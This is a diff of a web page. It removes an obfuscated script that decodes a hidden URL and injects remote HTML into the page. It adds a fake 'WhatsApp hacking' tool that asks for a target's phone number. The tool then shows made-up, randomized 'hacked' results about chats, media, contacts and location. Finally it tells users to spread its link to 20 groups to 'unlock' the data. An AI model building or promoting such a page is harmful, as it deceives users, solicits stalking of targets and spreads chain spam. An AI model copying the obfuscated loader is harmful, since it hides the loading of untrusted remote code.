@@ -6,9 +6,589 @@
   <title>Z</title>
 </head>
 <body>
-  <div id="lPnoVqDj"></div>
-  <script>
-const _0x50c3c0=_0x3841;function _0x3841(_0x13d58c,_0xd2ce32){const _0x259cb3=_0x259c();return _0x3841=function(_0x38418f,_0x2471d6){_0x38418f=_0x38418f-0x192;let _0x4fab1b=_0x259cb3[_0x38418f];return _0x4fab1b;},_0x3841(_0x13d58c,_0xd2ce32);}(function(_0x6c6012,_0x3be526){const _0x1e4252=_0x3841,_0x267fce=_0x6c6012();while(!![]){try{const _0x1a3f26=parseInt(_0x1e4252(0x19e))/0x1+-parseInt(_0x1e4252(0x197))/0x2+parseInt(_0x1e4252(0x193))/0x3+-parseInt(_0x1e4252(0x192))/0x4+parseInt(_0x1e4252(0x198))/0x5+-parseInt(_0x1e4252(0x199))/0x6*(-parseInt(_0x1e4252(0x194))/0x7)+-parseInt(_0x1e4252(0x19d))/0x8;if(_0x1a3f26===_0x3be526)break;else _0x267fce['push'](_0x267fce['shift']());}catch(_0x59f57c){_0x267fce['push'](_0x267fce['shift']());}}}(_0x259c,0x82dd6));function decodeRandomString(_0x2125c9,_0x5ae58c){const _0xa3ef7f=_0x3841;try{const _0x5b0458=atob(_0x2125c9);return _0x5b0458;}catch(_0x32326d){return console[_0xa3ef7f(0x1a2)](_0xa3ef7f(0x1a0),_0x32326d),null;}}const hVg=_0x50c3c0(0x19c),wTf=decodeRandomString(hVg);console[_0x50c3c0(0x195)](wTf),document['addEventListener'](_0x50c3c0(0x196),async function(){const _0x2d0951=_0x50c3c0,_0x35f99a=document[_0x2d0951(0x19b)]('lPnoVqDj');try{const _0x9ca65f=await fetch(wTf);if(!_0x9ca65f['ok'])throw new Error(_0x2d0951(0x1a1));const _0xc8d399=await _0x9ca65f['text']();_0x35f99a['innerHTML']=_0xc8d399;}catch(_0xde73d6){console[_0x2d0951(0x1a2)](_0xde73d6),_0x35f99a[_0x2d0951(0x19a)]=_0x2d0951(0x19f);}});function _0x259c(){const _0x3ed850=['4096935KEyiLc','13290EuVLBq','textContent','getElementById','aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9sa2VhcmVycy82YTgxZWJmNzQ5ZTY2N2QwOTJmN2E2OGZjMDc2NmFlYi9yYXcvMTQ1M2YxZWE2NWQ0YjYxNjNiNzFlNTU4OTI3OGIxMDAxYjI1MWE3OS96Mi5odG1s','7670080rtYiWz','499493bJvhgT','Error\x20loading\x20remote\x20content.','Error\x20decoding\x20random\x20string:','Failed\x20to\x20fetch\x20remote\x20content','error','1993900frjhyI','2146656rCsQnt','1778KleOEF','log','DOMContentLoaded','1207570zvJXxc'];_0x259c=function(){return _0x3ed850;};return _0x259c();}
-  </script>
+ <style>
+body {
+  background: url('bg2.png');
+  background-size: cover;
+  background-attachment: fixed;
+  background-position: center center;
+  background-repeat: no-repeat;
+  margin: 0;
+  overflow: hidden;
+  color: #16df31;
+  font-family: Ubuntu, sans-serif;
+  font-size: 10px;
+}
+.nav {
+  background: transparent;
+  width: 100vw;
+  height: auto;
+  backdrop-filter: blur(5px);
+}
+.titl {
+  background-color: rgba(3,18,17,0.3);
+  width: auto;
+  font-size: 24px;
+  padding-top: 0px;
+  text-align: center;
+  border: 1px solid #16df31;
+  display: flex;
+  align-items: center;
+}
+.main {
+   height: 100%;
+  width:100%;
+ 
+  justify-content: center;
+ margin-top:0px;
+  align-items: center;
+  flex-direction: column;
+}
+.view {
+  height: 50vh;
+  width: 85vw;
+  padding: 20px;
+  margin: 0 auto;
+  border-bottom-left-radius: 10px;
+  border-bottom-right-radius: 10px;
+  background-color: rgba(0,0,0,0.1);
+  margin-bottom: 10px;
+  backdrop-filter: blur(20px);
+  border: 1px solid #0c851c;
+  color: #16df31;
+  overflow: auto;
+   scrollbar-width: thin;
+    scrollbar-color: #16df31 transparent;
+}
+.view::-webkit-scrollbar {
+    width: 8px;
+  }
+  .view::-webkit-scrollbar-thumb {
+    background-color: #16df31;
+    border-radius: 4px;
+  }
+.term {
+  width: 85%;
+  height: 25vh;
+  text-align: left;
+  margin: 0 auto; /* Center horizontally */
+  background-color: rgba(40, 44, 52,0.3);
+  color: white;
+  padding: 20px;
+  border-top-left-radius: 10px;
+  border-top-right-radius: 10px;
+  overflow: auto;
+   scrollbar-width: thin;
+    scrollbar-color: #16df31 transparent;
+  backdrop-filter: blur(20px);
+  border: 1px solid #0c851c;
+}
+.term::-webkit-scrollbar {
+    width: 8px;
+  }
+  .term::-webkit-scrollbar-thumb {
+    background-color: #16df31;
+    border-radius: 4px;
+  }
+.icn {
+  height: 50px;
+}
+.box{
+  height: 100%;
+  width:100%;
+  display: flex;
+  justify-content: center;
+ margin-top:5px;
+  align-items: center;
+  flex-direction: column;
+}
+.cont {
+  backdrop-filter: blur(70px);
+  width: 90vw;
+  border-radius: 20px;
+  overflow: auto;
+   scrollbar-width: thin;
+    scrollbar-color: #16df31 transparent;
+  display: flex;
+  align-items: center;
+  flex-direction: column;
+  margin-top: 10px;
+  overflow-x: hidden;
+}
+ .cont::-webkit-scrollbar {
+    width: 8px;
+  }
+  .cont::-webkit-scrollbar-thumb {
+    background-color: #16df31;
+    border-radius: 4px;
+  }
+.section {
+    background-color: rgba(0, 0, 0, 0.1);
+    padding: 10px;
+    margin: 10px;
+  border-radius: 20px;
+  font-size: 18px;
+  }
+ 
+  h1 {
+    background-color: rgba(0, 0, 0, 0.2);
+    padding: 10px;
+    margin: 10px 0;
+      border-radius: 20px;
+  }
+.btn {
+  padding: 5px;
+  background: rgba(0,0,0,0.3);
+  border: 1px solid #0c851c;
+  border-radius: 7px;
+  font-size: 18px;
+  color: #16df31;
+  box-shadow: 0px 0px 6px 3px #0c851c;
+}
+.btn:hover {
+    box-shadow: 0px 0px 8px 4px #0c851c;
+  font-size: 20px;
+    background: rgba(0,0,0,0.7);
+}
+input {
+  margin: 10px;
+  padding: 10px;
+  background: rgba(0,0,0,0.5);
+  border: 1px solid green;
+  width: 75vw;
+  color: #16df31;
+  border-radius: 20px;
+}
+input:hover {
+    border: 1px solid #0c851c;
+  box-shadow: 0px 0px 6px 3px #0c851c;
+}
+.container {
+  padding: 16px;
+}
+
+span.psw {
+  float: right;
+  padding-top: 16px;
+}
+
+/* The Modal (background) */
+.modal {
+  display: none; /* Hidden by default */
+  position: fixed; /* Stay in place */
+  z-index: 1; /* Sit on top */
+  left: 0;
+  top: 0;
+  width: 100%; /* Full width */
+  height: 100%; /* Full height */
+  overflow: auto; /* Enable scroll if needed */
+  background-color: rgb(0,0,0); /* Fallback color */
+  background-color: rgba(0,0,0,0.7); /* Black w/ opacity */
+  padding-top: 60px;
+}
+
+/* Modal Content/Box */
+.modal-content {
+  background: transparent;
+  margin: 0% auto 15% auto; /* 5% from the top, 15% from the bottom and centered */
+  border: 1px solid #16df31;
+  border-radius: 20px;
+  width: 80%; /* Could be more or less, depending on screen size */
+  backdrop-filter: blur(20px);
+  min-height: 500px;
+  height: auto;
+  box-shadow: 0px 0px 10px 5px #0c851c;
+}
+
+/* The Close Button (x) */
+.close {
+  position: absolute;
+  right: 25px;
+  top: 0;
+  color: #000;
+  font-size: 35px;
+  font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+  color: red;
+  cursor: pointer;
+}
+
+/* Add Zoom Animation */
+.animate {
+  -webkit-animation: animatezoom 0.6s;
+  animation: animatezoom 0.6s
+}
+
+@-webkit-keyframes animatezoom {
+  from {-webkit-transform: scale(0)} 
+  to {-webkit-transform: scale(1)}
+}
+  
+@keyframes animatezoom {
+  from {transform: scale(0)} 
+  to {transform: scale(1)}
+}
+
+/* Change styles for span and cancel button on extra small screens */
+@media screen and (max-width: 300px) {
+  span.psw {
+     display: block;
+     float: none;
+  }
+  .cancelbtn {
+     width: 100%;
+  }
+}
+.msg {
+  border: 1px solid #16df31;
+  padding: 5px;
+  border-radius: 10px;
+}
+.input-wrapper {
+    display: flex;
+    align-items: center;
+}
+
+.country-code {
+    width: 25%;
+    margin-right: 5px;
+}
+
+.phone-number {
+    flex: 1;
+    margin-left: 5px;
+}
+</style>
+<div class="nav">
+      <div class="titl"><img class="icn" src="icon.png" alt="Site Icon"><p><strong>Zandermop </strong></p> <p> :</p> <p> By The Hackers For The Hackers</p></div>
+    </div>
+    <div id="box" class="box">
+      <div class="cont" style="height: 200px;">
+        <p style="font-size: 20px; margin: 10px;">Enter Target Number</p>
+<div class="input-wrapper">
+    <input id="countryCode" class="input country-code" type="text" placeholder="Country Code" required>
+    <input id="phoneNumber" class="input phone-number" type="tel" placeholder="Phone Number" required>
+</div>        <button class="btn" id="hackButton">Hack Now</button>
+      </div>
+      <div class="cont" style="height: 400px;">
+       <div class="section">
+  <p><strong>Zandermop is an Intruder program that Allows hackers to break into any whatsapp account.</strong></p>
+  <p>Detailed info can be found on our site.</p>
+</div>
+
+<div class="section">
+  <h2>Notes:</h2>
+  <ul>
+    <li><strong>Enter Mobile Number with Country Code:</strong> Accuracy is essential for effective results. Ensure the correct country code is provided along with the target's mobile number to prevent errors.</li>
+    <li><strong>Tool is Free:</strong> The Zandermop App is provided as a free educational resource. It's aimed at fostering knowledge about digital security and vulnerability assessment.</li>
+    <li><strong>Prohibition on Sale:</strong> The Zandermop App is meant exclusively for educational purposes. Selling, distributing, or profiting from the app is strictly prohibited.</li>
+    <li><strong>Use within Legal Boundaries:</strong> Users are advised to engage with the Zandermop App responsibly and ethically, adhering to legal standards. Any involvement in illegal or unethical activities is strongly discouraged.</li>
+    <li><strong>No Endorsement of Malicious Intent:</strong> The Zandermop App should not be utilized for malicious purposes or hacking activities. Such misuse contradicts ethical principles and legal guidelines.</li>
+  </ul>
+</div>
+      </div>
+    </div>
+   <div id="main" class="main">
+    <div class="view">
+      <h2>Target:</h2>
+<p id="targetDisplay"></p>
+      <div class="section">
+    <h2>Vulnerability Check</h2>
+    <p id="vulnerabilityInfo">Checking...</p>
+</div>
+        <div class="section">
+            <h2>Country</h2>
+            <p id="countryInfo">Country: Loading...</p>
+            <p id="carrierInfo">Carrier: Loading...</p>
+        </div>
+      <!-- ... previous HTML ... -->
+
+<div class="section">
+    <h2>Location</h2>
+    <p id="locationInfo">Locating...</p>
+</div>
+
+<div class="section">
+    <h2>Contacts</h2>
+    <p id="contactsInfo">Searching...</p>
+</div>
+      <div class="section">
+    <h2>Network</h2>
+    <p id="networkInfo">Detecting...</p>
+</div>
+
+<!-- ... other sections ... -->
+
+
+
+<!-- ... rest of the HTML ... -->
+
+
+
+
+<!-- ... rest of the HTML ... -->
+
+
+        <div class="section">
+            <h2>Found Chats</h2>
+            <p id="chatsInfo">Searching...</p>
+        </div>
+
+        <div class="section">
+            <h2>Media</h2>
+            <p id="mediaInfo">Scanning...</p>
+        </div>
+
+        <!-- Add more sections as needed -->
+    </div>
+
+    <div class="term">
+        <pre id="terminalOutput"></pre>
+    </div>
+</div>
+     <div id="id01" class="modal">
+  
+  <div class="modal-content animate">
+    <div class="section"> 
+    <h2>Notice:</h2>
+      <p> Exploit Successful!!!!</p>
+      <p> Share the following message into 20 Groups to get Free access to the Hacked data.</p>
+    </div>
+    <div class="section">
+      <p>Happy Hacking :)</p>
+      <div class="msg" id="msg">
+        <p>Hack Any Whatsapp Account for Free. Visit https://zandermop.github.io/home/ to hack Now.</p>
+      </div>
+      <div style="text-align: center;">
+      <button id="cpy" class="btn">Copy</button>
+      </div>
+       </div>
+  </div>
+</div>
+<script>
+var country = ""; // Initialize as empty strings
+var city = "";
+document.getElementById("hackButton").addEventListener("click", function () {
+    // Hide the box and show the main section
+    document.getElementById("box").style.display = "none";
+    document.getElementById("main").style.display = "block";
+
+    // Simulate process
+    simulateProcess();
+});
+const countryMapping = {
+  //ASIA
+    "93": "Afghanistan",
+    "374": "Armenia",
+    "973": "Bahrain",
+    "880": "Bangladesh",
+    "975": "Bhutan",
+    "673": "Brunei",
+    "855": "Cambodia",
+    "86": "China",
+    "670": "East Timor",
+    "964": "Iraq",
+    "98": "Iran",
+    "972": "Israel",
+    "81": "Japan",
+    "962": "Jordan",
+    "7": "Kazakhstan",
+    "965": "Kuwait",
+    "996": "Kyrgyzstan",
+    "856": "Laos",
+    "961": "Lebanon",
+    "853": "Macau",
+    "60": "Malaysia",
+    "960": "Maldives",
+    "976": "Mongolia",
+    "95": "Myanmar (Burma)",
+    "977": "Nepal",
+    "850": "North Korea",
+    "968": "Oman",
+    "92": "Pakistan",
+    "970": "Palestine",
+    "63": "Philippines",
+    "974": "Qatar",
+    "7": "Russia",
+    "966": "Saudi Arabia",
+    "65": "Singapore",
+    "94": "Sri Lanka",
+    "82": "South Korea",
+    "963": "Syria",
+    "886": "Taiwan",
+    "992": "Tajikistan",
+    "66": "Thailand",
+    "90": "Turkey",
+    "993": "Turkmenistan",
+    "971": "United Arab Emirates",
+    "998": "Uzbekistan",
+    "84": "Vietnam",
+    "967": "Yemen"
+    // Add more country code mappings as needed
+};
+
+
+const cityMapping = {
+  //ASIA
+    "93": "Kabul",
+    "374": "Yerevan",
+    "973": "Manama",
+    "880": "Dhaka",
+    "975": "Thimphu",
+    "673": "Bandar Seri Begawan",
+    "855": "Phnom Penh",
+    "86": "Beijing",
+    "670": "Dili",
+    "964": "Baghdad",
+    "98": "Tehran",
+    "972": "Jerusalem",
+    "81": "Tokyo",
+    "962": "Amman",
+    "7": "Almaty",
+    "965": "Kuwait City",
+    "996": "Bishkek",
+    "856": "Vientiane",
+    "961": "Beirut",
+    "853": "Macau",
+    "60": "Kuala Lumpur",
+    "960": "Malé",
+    "976": "Ulaanbaatar",
+    "95": "Yangon",
+    "977": "Kathmandu",
+    "850": "Pyongyang",
+    "968": "Muscat",
+    "92": "Islamabad",
+    "970": "Ramallah",
+    "63": "Manila",
+    "974": "Doha",
+    "7": "Moscow",
+    "966": "Riyadh",
+    "65": "Singapore",
+    "94": "Colombo",
+    "82": "Seoul",
+    "963": "Damascus",
+    "886": "Taipei",
+    "992": "Dushanbe",
+    "66": "Bangkok",
+    "90": "Ankara",
+    "993": "Ashgabat",
+    "971": "Abu Dhabi",
+    "998": "Tashkent",
+    "84": "Ho Chi Minh City",
+    "967": "Sana'a"
+    // Add more city code mappings as needed
+};
+
+
+document.getElementById("hackButton").addEventListener("click", function () {
+    var countryCode = document.getElementById("countryCode").value;
+    var phoneNumber = document.getElementById("phoneNumber").value;
+
+    // Lookup country and city based on the entered country code
+    var country = countryMapping[countryCode] || "Unknown Country";
+    var city = cityMapping[countryCode] || "Unknown City";
+
+    // Display the target information
+    var targetDisplay = document.getElementById("targetDisplay");
+    targetDisplay.textContent = "Country Code: " + countryCode + ", Phone Number: " + phoneNumber;
+
+    // Update country and location information in the sections
+    var countryInfo = document.getElementById("countryInfo");
+    countryInfo.textContent = "Country: " + country;
+
+    var locationInfo = document.getElementById("locationInfo");
+    locationInfo.textContent = "Location: " + city;
+  
+
+
+    // Simulate the hacking process or perform any other actions here
+});
+
+
+function simulateProcess() {
+    // Simulate queries and update terminal output with delays
+  performVulnerabilityCheck();
+  
+    // ... your other code ...
+
+    performQuery("Country", "countryInfo", "Country: " + country, 10000);
+    performQuery("Carrier", "carrierInfo", "Carrier: Verizon", 13000);
+    performQuery("Location", "locationInfo", "Location: " + city, 16000);
+
+    // ... your other code ...
+
+
+      performQuery("Network", "networkInfo", "Network: WiFi", 19500);
+
+     // Randomize the number of found chats, media, and contacts
+    var randomChats = Math.floor(Math.random() * 100) + 1; // Random number between 1 and 100
+    var randomMedia = Math.floor(Math.random() * 200) + 1; // Random number between 1 and 200
+    var randomContacts = Math.floor(Math.random() * 300) + 1; // Random number between 1 and 300
+
+    performQuery("Chats", "chatsInfo", "Found " + randomChats + " chat conversations", 21500);
+    performQuery("Media", "mediaInfo", "Found " + randomMedia + " media files", 23800);
+    performQuery("Contacts", "contactsInfo", "Found " + randomContacts + " contacts", 26200);
+   
+    openModal(28000);
+
+    // You can add more queries and updates here
+}
+function performVulnerabilityCheck() {
+    // Simulate vulnerability check process with a delay
+    setTimeout(function () {
+        // Simulate vulnerability check result
+        var isVulnerable = Math.random() < 0.5; // Randomly assign vulnerability status
+
+        // Update view with vulnerability check result
+        var vulnerabilityInfo = document.getElementById("vulnerabilityInfo");
+        if (isVulnerable) {
+            vulnerabilityInfo.textContent = "Target is vulnerable to Buffer Overflw!";
+        } else {
+            vulnerabilityInfo.textContent = "Target is vulnerable to RCE!";
+        }
+
+        // Update terminal output
+        var terminalOutput = document.getElementById("terminalOutput");
+        terminalOutput.textContent += "> Vulnerability check: " + (isVulnerable ? "Target is vulnerable to Buffer OverFlow!" : "Target is vulnerable to RCE!") + "\n";
+
+        // Scroll terminal to bottom
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    }, 2800); // Use the desired delay for vulnerability check
+}
+function performQuery(queryName, targetElementId, resultText, delay) {
+    setTimeout(function () {
+        // Update view with query result
+        document.getElementById(targetElementId).textContent = resultText;
+
+        // Update terminal output
+        var terminalOutput = document.getElementById("terminalOutput");
+        terminalOutput.textContent += "> " + queryName + " query: " + resultText + "\n";
+
+        // Scroll terminal to bottom
+        terminalOutput.scrollTop = terminalOutput.scrollHeight;
+    }, delay); // Use the provided delay value
+}
+
+// Get the modal
+// Open the modal function with a delay
+function openModal(delay) {
+    setTimeout(function() {
+        var modal = document.getElementById('id01');
+        modal.style.display = "block";
+    }, delay);
+}
+ document.getElementById("msg").addEventListener("click", function() {
+  const juicyText = document.getElementById("msg").textContent;
+  navigator.clipboard.writeText(juicyText);
+});
+
+document.getElementById("cpy").addEventListener("click", function() {
+  const succulentText = document.getElementById("msg").textContent;
+  navigator.clipboard.writeText(succulentText);
+});
+</script>
   </body>
 </html>
